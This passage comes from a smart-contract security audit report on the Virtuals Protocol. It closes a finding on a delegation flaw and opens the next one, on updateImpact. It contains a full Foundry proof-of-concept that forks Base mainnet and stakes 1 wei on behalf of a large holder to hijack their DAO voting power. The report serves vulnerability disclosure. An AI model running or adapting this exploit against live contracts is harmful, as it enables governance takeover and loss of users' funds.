<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_balanceCheckpoints</span><span class="mtk1">[</span><span class="mtk12">receiver</span><span class="mtk1">].</span><span class="mtk11">push</span><span class="mtk1">(</span><span class="mtk11">clock</span><span class="mtk1">(), </span><span class="mtk12">SafeCast</span><span class="mtk1">.</span><span class="mtk11">toUint208</span><span class="mtk1">(</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">receiver</span><span class="mtk1">)));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>Since these are the tokens that are used as voting power in the AgentDAO, a malicious user can donate 1 wei to multiple users with high balances, receive a majority voting power, then submit a malicious proposal.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-1"><a class="anchor before" aria-label="recommended mitigation steps 1 permalink" href="#recommended-mitigation-steps-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Either remove the automatic call to <code>_delegate</code> or only do the call if <code>sender == receiver</code>.</p>
<h3 style="position:relative;" id="proof-of-concept"><a class="anchor before" aria-label="proof of concept permalink" href="#proof-of-concept"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>Create a new foundry project, set <code>BASE_RPC_URL</code>, and run.</p>
<pre data-index="5" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// SPDX-License-Identifier: UNLICENSED</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pragma</span><span class="mtk1"> </span><span class="mtk12">solidity</span><span class="mtk1"> ^</span><span class="mtk7">0.8</span><span class="mtk1">.</span><span class="mtk7">13</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">Test</span><span class="mtk1">, </span><span class="mtk12">console</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"forge-std/Test.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IERC20</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">spender</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">account</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IAgentToken</span><span class="mtk1"> </span><span class="mtk10">is</span><span class="mtk1"> </span><span class="mtk10">IERC20</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">distributeTaxTokens</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">projectTaxPendingSwap</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">projectTaxRecipient</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setProjectTaxRecipient</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">projectTaxRecipient_</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">; </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setSwapThresholdBasisPoints</span><span class="mtk1">(</span><span class="mtk12">uint16</span><span class="mtk1"> </span><span class="mtk12">swapThresholdBasisPoints_</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setProjectTaxRates</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint16</span><span class="mtk1"> </span><span class="mtk12">newProjectBuyTaxBasisPoints_</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint16</span><span class="mtk1"> </span><span class="mtk12">newProjectSellTaxBasisPoints_</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IVeToken</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">stake</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">delegatee</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">delegates</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">account</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IUniswapV2Router</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">swapExactTokensForTokens</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountIn</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountOutMin</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">path</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">deadline</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">amounts</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">addLiquidity</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenA</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenB</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountADesired</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountBDesired</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountAMin</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountBMin</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">deadline</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountA</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">amountB</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">liquidity</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">StakeDelegatePOC</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">Test</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IAgentToken</span><span class="mtk1"> </span><span class="mtk12">agentToken</span><span class="mtk1"> = </span><span class="mtk11">IAgentToken</span><span class="mtk1">(</span><span class="mtk7">0x1C4CcA7C5DB003824208aDDA61Bd749e55F463a3</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">agentPair</span><span class="mtk1"> = </span><span class="mtk7">0xD418dfE7670c21F682E041F34250c114DB5D7789</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IERC20</span><span class="mtk1"> </span><span class="mtk12">virtualToken</span><span class="mtk1"> = </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk7">0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">bridge</span><span class="mtk1"> = </span><span class="mtk7">0x4200000000000000000000000000000000000010</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IUniswapV2Router</span><span class="mtk1"> </span><span class="mtk12">router</span><span class="mtk1"> = </span><span class="mtk11">IUniswapV2Router</span><span class="mtk1">(</span><span class="mtk7">0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">BASE_RPC_URL</span><span class="mtk1"> = </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">envString</span><span class="mtk1">(</span><span class="mtk8">"BASE_RPC_URL"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">user</span><span class="mtk1"> = </span><span class="mtk11">makeAddr</span><span class="mtk1">(</span><span class="mtk8">"user"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualAmount</span><span class="mtk1"> = </span><span class="mtk7">2000</span><span class="mtk1"> </span><span class="mtk12">ether</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setUp</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">forkId</span><span class="mtk1"> = </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">createFork</span><span class="mtk1">(</span><span class="mtk12">BASE_RPC_URL</span><span class="mtk1">, </span><span class="mtk7">29_225_700</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">selectFork</span><span class="mtk1">(</span><span class="mtk12">forkId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Set up the user with virtual tokens</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">prank</span><span class="mtk1">(</span><span class="mtk12">bridge</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">virtualToken</span><span class="mtk1">.</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk12">virtualAmount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_malicious_stake_delegate_poc</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">virtualToken</span><span class="mtk1">.</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">router</span><span class="mtk1">), </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">agentToken</span><span class="mtk1">.</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">router</span><span class="mtk1">), </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Swap half of the virtual tokens to agent tokens</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">path</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">address</span><span class="mtk1">[](</span><span class="mtk7">2</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">path</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">virtualToken</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">path</span><span class="mtk1">[</span><span class="mtk7">1</span><span class="mtk1">] = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">agentToken</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">router</span><span class="mtk1">.</span><span class="mtk11">swapExactTokensForTokens</span><span class="mtk1">(</span><span class="mtk12">virtualAmount</span><span class="mtk1"> / </span><span class="mtk7">2</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">path</span><span class="mtk1">, </span><span class="mtk12">user</span><span class="mtk1">, </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Add liquidity to the pool to get LP tokens</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">router</span><span class="mtk1">.</span><span class="mtk11">addLiquidity</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">virtualToken</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">agentToken</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">virtualAmount</span><span class="mtk1"> / </span><span class="mtk7">2</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">agentToken</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">user</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk7">1</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk7">1</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">user</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">gameDeployer</span><span class="mtk1"> = </span><span class="mtk7">0xD38493119859b8806ff28C32c41fdd67Ef41b8Ef</span><span class="mtk1">; </span><span class="mtk3">// Main holder of veTokens</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IVeToken</span><span class="mtk1"> </span><span class="mtk12">veToken</span><span class="mtk1"> = </span><span class="mtk11">IVeToken</span><span class="mtk1">(</span><span class="mtk7">0x974a21754271dD3d71a16F2852F8e226a9276b3E</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertNotEq</span><span class="mtk1">(</span><span class="mtk12">veToken</span><span class="mtk1">.</span><span class="mtk11">delegates</span><span class="mtk1">(</span><span class="mtk12">gameDeployer</span><span class="mtk1">), </span><span class="mtk12">user</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Stake 1 wei of LP for gameDeployer to update delegate</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">agentPair</span><span class="mtk1">).</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">veToken</span><span class="mtk1">), </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">veToken</span><span class="mtk1">.</span><span class="mtk11">stake</span><span class="mtk1">(</span><span class="mtk7">1</span><span class="mtk1">, </span><span class="mtk12">gameDeployer</span><span class="mtk1">, </span><span class="mtk12">user</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">assertEq</span><span class="mtk1">(</span><span class="mtk12">veToken</span><span class="mtk1">.</span><span class="mtk11">delegates</span><span class="mtk1">(</span><span class="mtk12">gameDeployer</span><span class="mtk1">), </span><span class="mtk12">user</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><strong>Virtuals marked as informative</strong></p>
<hr>
<h2 style="position:relative;" id="h-03-public-servicenftupdateimpact-call-leads-to-cascading-issue"><a class="anchor before" aria-label="h 03 public servicenftupdateimpact call leads to cascading issue permalink" href="#h-03-public-servicenftupdateimpact-call-leads-to-cascading-issue"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-9">[H-03] Public <code>ServiceNft::updateImpact</code> call leads to cascading issue</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-559">YouCrossTheLineAlfie</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-350">Astroboy</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-176">debo</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-427">EPSec</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-11">gmh5225</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-394">gregom</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-598">hecker_trieu_tien</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-505">Heyu</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-390">holtzzx</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-575">LeoGold</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-418">levi_104</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-627">maxzuvex</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-325">oakcobalt</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-689">Pelz</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-469">PotEater</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-827">Rorschach</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-437">shui</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-455">soloking</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-605">TheDonH</a></em></p>
<p>The <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L58"><code>ServiceNft::mint</code></a> is designed to be <a href="https://whitepaper.virtuals.io/about-virtuals-1/the-protocol/co-contribution-and-provenance/modular-consensus-framework">called via governance</a>:</p>
